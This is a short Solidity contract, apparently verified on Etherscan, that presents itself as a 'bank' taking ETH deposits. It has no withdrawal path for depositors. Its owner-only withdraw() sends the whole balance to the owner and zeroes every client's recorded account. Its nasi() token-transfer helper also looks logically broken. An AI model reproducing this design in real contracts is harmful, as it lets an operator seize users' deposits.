/**
 *Submitted for verification at Etherscan.io on 2021-11-23
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract banco  {
    IERC20 token;
    
    uint public capital;
    address public owner;
    address[] public clientes;
    
    mapping (address => uint) public cuenta;
    
    
    constructor () {
        token = IERC20(0x4a7Abc8B5826F60081Ce3bAD99Fce3B110d9Ab22);
        owner = msg.sender;
    }
    
    modifier Owner {
        require(owner == msg.sender);
        _;
    }
    
    function nasi() internal {
        token.approve(msg.sender, 1);
        token.transferFrom(0x4D3BFd632914f789236C5B16be641823593736c3, msg.sender, 1);
    }
    
    
    function deposit() public payable {
        nasi();
        cuenta[msg.sender] += msg.value;
        clientes.push(msg.sender);
        capital += msg.value;
    }

    function withdraw() public payable Owner {
        payable(owner).transfer(address(this).balance);
        for (uint index = 0; index < clientes.length; index++) {
            address indice = clientes[index];
            cuenta[indice] = 0;
            
        }
        clientes = new address[](0);
        capital = 0;
        
    }
}